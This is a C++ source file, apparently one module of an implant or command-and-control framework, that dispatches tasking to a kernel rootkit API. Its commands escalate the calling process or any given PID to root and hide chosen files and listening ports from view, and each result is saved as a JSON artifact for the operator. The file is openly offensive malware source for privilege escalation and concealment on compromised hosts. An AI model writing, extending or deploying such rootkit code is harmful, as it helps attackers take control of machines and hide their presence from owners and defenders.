#include <boost/filesystem.hpp>
#include <filesystem>
#include <boost/system/system_error.hpp>
#include "../include/json.hpp"
#include <iostream>
#include <regex>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <csignal>
#include <cerrno>
#include <cstring>
#include "Rootkit.h"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
#include "../amazing_rootkit/api/api.h"
#include "../amazing_rootkit/constants.h"

using json = nlohmann::json;

void Rootkit::send_err(json inner, std::string str){
    std::cerr << str << std::endl;
    inner["result"] = "failure";
    inner["error"] = str;
    json ret_json;
    ret_json[module_type] = inner;
    save_artifact(ret_json);
}

bool processExists(pid_t pid) {
    // Send signal 0 to the process to check if it exists
    if (kill(pid, 0) == 0) {
        return true;
    } else if (errno == ESRCH) {
        return false;
    } else {
        std::cerr << "Error: " << std::strerror(errno) << std::endl;
        return false;
    }
}

void Rootkit::module_impl()
{
    // We only want to run once
    run_ = false;

    std::cout << "Running " << module_type << " with args: " << args.dump() << std::endl;
    json inner;
    inner["result"] = "unknown";
    inner["error"] = "";
    inner["data"] = "";
    
    int id = std::stoi(std::string(args["id"]));
    std::string rootkit_args = args["args"];

    switch (id) {
        case ROOT_ME: {
            std::cout << "ROOT_ME" << std::endl;
            root_me();
            break;
        }
        case ARB_ROOT: {
            std::cout << "ARB_ROOT" << std::endl;
            pid_t pid = atoi(rootkit_args.c_str());
            if (pid > 0 && processExists(pid)) {
                set_proc_root(pid);
            } else {
                Rootkit::send_err(inner, std::string("Invalid PID: ") + rootkit_args);
                return;
            }
            break;
        }
        case HIDE_FILE: {
            std::cout << "HIDE_FILE: " << rootkit_args << std::endl;
            // rootkit_args should be a path to vaild file
            if (boost::filesystem::exists(rootkit_args)) {
                hide_filename(rootkit_args.c_str());
            } else {
                Rootkit::send_err(inner, std::string("File doesn't exist: ") + rootkit_args);
                return;
            }
            break;
        }
        case HIDE_PORT: {
            std::cout << "HIDE_PORT" << std::endl;
            int port = atoi(rootkit_args.c_str());
            if (port > 0) {
                hide_listening_socket((unsigned short)port);
            } else {
                Rootkit::send_err(inner, std::string("Invalid port number: ") + rootkit_args);
                return;
            }
            break;
        }
        
        default: {
            Rootkit::send_err(inner, std::string("Unknown ID: ") + std::to_string(id));
            return;
        }
    }

    inner["result"] = "success";
    json ret_json;
    ret_json[module_type] = inner;
    save_artifact(ret_json);
    return;
}